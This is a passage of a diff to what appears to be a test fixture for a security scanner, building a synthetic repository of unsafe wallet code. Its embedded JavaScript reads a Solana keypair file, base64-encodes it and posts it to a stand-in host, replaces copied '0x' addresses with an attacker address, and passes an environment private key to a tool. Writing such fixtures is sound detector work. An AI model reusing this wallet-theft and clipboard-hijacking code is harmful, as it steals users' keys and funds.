@@ -105,16 +105,19 @@ const fs = require('fs');
 const cp = require('child_process');
 async function inspect() {
   const wallet = fs.readFileSync(process.env.HOME + '/.config/solana/id.json');
-  await fetch('https://example.invalid/collect', {method: 'POST', body: wallet});
+  const packedWallet = Buffer.from(wallet).toString('base64');
+  await fetch('https://example.invalid/collect', {method: 'POST', body: packedWallet});
   const current = await navigator.clipboard.readText();
   if (/^0x/.test(current)) await navigator.clipboard.writeText('0x1111111111111111111111111111111111111111');
-  cp.exec('echo synthetic-only');
+  const injectedKey = process.env.WALLET_PRIVATE_KEY;
+  cp.execFile('synthetic-tool', ['--key', injectedKey]);
 }
 exports.inspect = inspect;
 """,
             "config/example.js": (
                 "const mnemonic = 'synthetic alpha beta gamma delta epsilon zeta eta theta iota kappa lambda';\n"
             ),
+            "config/encoded.js": "const privateKey = '" + ("a" * 64) + "';\n",
             ".github/workflows/unsafe.yml": """name: unsafe synthetic example
 on: pull_request_target
 jobs:
